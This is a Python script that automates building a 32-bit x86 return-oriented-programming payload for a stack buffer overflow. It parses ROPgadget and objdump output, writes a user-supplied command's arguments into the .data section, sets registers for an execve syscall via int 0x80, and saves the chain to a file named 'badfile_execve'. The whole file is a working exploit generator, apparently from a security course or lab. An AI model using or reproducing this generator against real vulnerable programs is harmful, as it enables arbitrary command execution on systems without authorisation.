# SIDEFFECTS
# gets command to execve as stdin input with input()
# requires overflow length passed as argument to function call
# requires gadgets from ROPgadget to be in gadgets.txt
# ROPgadget --binary file_name > gadgets.txt
# requires objdump to be in objdump.txt
# objdump -h file_name
# outputs rop chain in badfile_execve


#IMPORTS

from struct import pack


### GLOBAL VARIABLES AND CONSTANTS
# [Yes I know, probably could have written this better without global variables but had to restructure code later and I mean it's fine really, it's bloody python]

gadgets_filename = "gadgets.txt"
objdump_filename = "objdump.txt"
badfile_name = "badfile_execve"

gadgets = {}
instructions = {"POPEAX": "pop eax ; ret",
                "POPEDX": "pop edx ; ret",
                "MOVINTOSTACK": "mov dword ptr [edx], eax ; ret",
                "INT80": "int 0x80",
                "INCEAX": "inc eax ; ret",
                "XOREAX": "xor eax, eax ; ret",
                "POPEBX": "pop ebx ; ret",
                "POPECX": "pop ecx ; ret",
                "POPECXEBX": "pop ecx ; pop ebx ; ret"}

### HELPER FUNCTIONS

# GET GADGETS FROM ROPGADGET OUTPUT



def check_line_for_req_gadgets(line):

    line_split = line.split(":")
    gadget_hex_str = line_split[0].strip()
    gadget_instr_str = line_split[1].strip()

    for gadget, instr in instructions.items():

        # check if we already have that gadget
        if gadget not in gadgets:

            if gadget_instr_str == instr:
                gadgets[gadget] = pack('<I', int(gadget_hex_str, 16))

def get_gadgets():
    with open(gadgets_filename, "r") as file:
        for line in file:

            # written so that we only have to loop through the lines of this file once

            if len(line) == 0:
                continue
            if line[0] != "0":
                continue
            
            check_line_for_req_gadgets(line)
    
    gadgets['DUMMY'] = pack('<I', 0x42424242)




# GET .data ADDRESS TO BUILD OUR STACK FOR EXECVE



def get_dot_data_addr():

    with open(objdump_filename, "r") as file:
        for line in file:
            stripped = line.strip()

            splits = stripped.split()

            if len(splits) < 4:
                continue

            if splits[1].strip() == ".data":
                return int(splits[3].strip(), 16)

    # return 0x080da060




# CONSTRUCT ROP CHAIN

# functions

def get_padding(overflow_length):
    return "A" * overflow_length

def get_command(command):
    return command.split()

def split_arg_by_4(argument):
    l = len(argument)

    splits = []
    last = ""
    splits_count = l // 4

    for i in range(splits_count):
        splits.append(argument[4 * i : 4 * i + 4])
    
    if l % 4 == 0:
        last = ""
    else:
        last = argument[-(l % 4):]

    return splits, last

def add_null_term(curr_addr):
    null_rop = b''
    null_rop += gadgets['POPEDX']
    null_rop += pack('<I', curr_addr)
    null_rop += gadgets['XOREAX']
    null_rop += gadgets['MOVINTOSTACK']

    return null_rop



### MAIN FUNCTION TO CALL
def gen(overflow_length):
    # get input command to execve
    COMMAND_TO_EXECVE = input("Enter command to execve: ")

    # get gadgets
    get_gadgets()

    # get .data address
    DATA_ADDR = get_dot_data_addr()

    # construct rop

    rop = b''

    # add padding
    rop += get_padding(overflow_length).encode('utf-8')

    # get command arguments
    command_args = get_command(COMMAND_TO_EXECVE)

    arg_locs = []

    curr_addr = DATA_ADDR

    ecx_at_syscall = 0
    ebx_at_syscall = 0
    edx_at_syscall = 0

    # ebx should be *arguments
    ebx_at_syscall = curr_addr

    # place arguments on stack
    for argument in command_args:
        splits, last = split_arg_by_4(argument)

        arg_locs.append(curr_addr)

        # each 'split' is 4 bytes long so can be moved directly
        for split in splits:
            rop += gadgets['POPEDX']
            rop += pack('<I', curr_addr)
            rop += gadgets['POPEAX']
            rop += split.encode('utf-8')
            rop += gadgets['MOVINTOSTACK']

            curr_addr += 4
        
        rop += gadgets['POPEDX']
        rop += pack('<I', curr_addr)
        rop += gadgets['POPEAX']
        rop += (last + "B"*(4-len(last))).encode('utf-8')
        rop += gadgets['MOVINTOSTACK']

        curr_addr += len(last)

        rop += add_null_term(curr_addr)
        curr_addr += 1


    # increment current address, far away from arguments and so that it is a multiple of 4 from DATA_ADDR
    curr_addr += 4 - (curr_addr - DATA_ADDR) % 4
    curr_addr += 12

    # edx should be *envp
    edx_at_syscall = curr_addr

    curr_addr += 12


    # ecx should be **arguments
    ecx_at_syscall = curr_addr

    # place pointers to argument locations on stack
    for loc in arg_locs:
        rop += gadgets['POPEDX']
        rop += pack("<I", curr_addr)
        rop += gadgets['POPEAX']
        rop += pack("<I", loc)
        rop += gadgets['MOVINTOSTACK']

        curr_addr += 4

    rop += add_null_term(curr_addr)
    curr_addr += 1

    # initialise $eax to be 11

    rop += gadgets['XOREAX']
    rop += gadgets['INCEAX'] * 11
    rop += gadgets['POPECXEBX']
    rop += pack("<I", ecx_at_syscall)
    rop += pack("<I", ebx_at_syscall)
    rop += gadgets['POPEDX']
    rop += pack("<I", edx_at_syscall)
    rop += gadgets['INT80']

    # rop is ready!

    # write it to a file or whatever really
    
    
    with open(badfile_name, "wb") as f:
        f.write(rop)
    
    return badfile_name
